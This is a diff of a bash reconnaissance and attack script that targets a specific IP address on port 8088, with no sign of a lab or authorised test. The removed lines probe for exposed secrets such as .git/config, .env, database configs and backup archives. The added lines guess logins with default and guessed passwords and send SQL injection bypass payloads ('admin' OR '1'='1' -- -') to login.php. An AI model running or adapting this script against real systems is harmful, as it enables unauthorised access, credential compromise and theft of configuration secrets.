@@ -1,9 +1,19 @@
 #!/bin/bash
 T=162.212.179.67
-P="login.php signup.php index.php dashboard.php home.php logout.php app.php settings.php integrations.php agents.php agent.php team.php users.php user.php profile.php admin.php api.php inc/api.php api/index.php healthz api/healthz robots.txt .git/config .git/HEAD composer.json .env config.php db.php inc/config.php inc/db.php lib/db.php includes/config.php assets/css/dashboard.css assets/js/app.js uploads/ backup/ www.zip site.zip dashboard.zip .htaccess sitemap.xml favicon.ico mail.php inbox.php crm.php leads.php campaigns.php media.php poster.php"
-for p in $P; do
-  out=$(curl -s -m 12 -o /tmp/x -w "%{http_code} %{size_download} %{content_type}" "http://$T:8088/$p")
-  echo "$out  /$p  :: $(head -c 90 /tmp/x | tr '\n' ' ')"
-done
-echo "=== css"
-curl -s -m 15 "http://$T:8088/assets/css/dashboard.css?v=v3.110.1" | head -c 300
+B="http://$T:8088"
+echo "=== login.php body"
+curl -s -m 12 "$B/login.php"
+echo
+echo "=== head /healthz /uploads/ /backup/ /logout.php"
+for p in healthz uploads/ backup/ logout.php "login.php?next=/uploads/"; do echo "-- $p"; curl -s -m 12 -o /dev/null -D - "$B/$p" | grep -iE "^HTTP|^Location"; done
+lg(){ local u="$1" p="$2"; echo "-- login $u / $p"; curl -s -m 15 -c /tmp/cj -b /tmp/cj -o /tmp/lb -D /tmp/lh -d "username=$u&password=$p" "$B/login.php"; grep -iE "^HTTP|^Location" /tmp/lh; grep -oiE "invalid[^<]{0,60}|error[^<]{0,60}|welcome|dashboard" /tmp/lb | head -3; }
+lg admin admin
+lg nina nina
+lg "nina@ninacdn.local" nina
+lg admin password
+lg admin admin123
+lg nina ninamarketing
+echo "=== sqli"
+curl -s -m 15 -c /tmp/cj2 -b /tmp/cj2 -o /tmp/sb -D /tmp/sh --data-urlencode "username=admin' OR '1'='1' -- -" --data-urlencode "password=x" "$B/login.php"; grep -iE "^HTTP|^Location" /tmp/sh; grep -oiE "invalid[^<]{0,60}|error[^<]{0,80}" /tmp/sb | head -3
+echo "=== login with admin' -- -"
+curl -s -m 15 -o /tmp/sb2 -D /tmp/sh2 --data-urlencode "username=admin'-- -" --data-urlencode "password=x" "$B/login.php"; grep -iE "^HTTP|^Location" /tmp/sh2; grep -oiE "invalid[^<]{0,60}|error[^<]{0,80}" /tmp/sb2|head -2
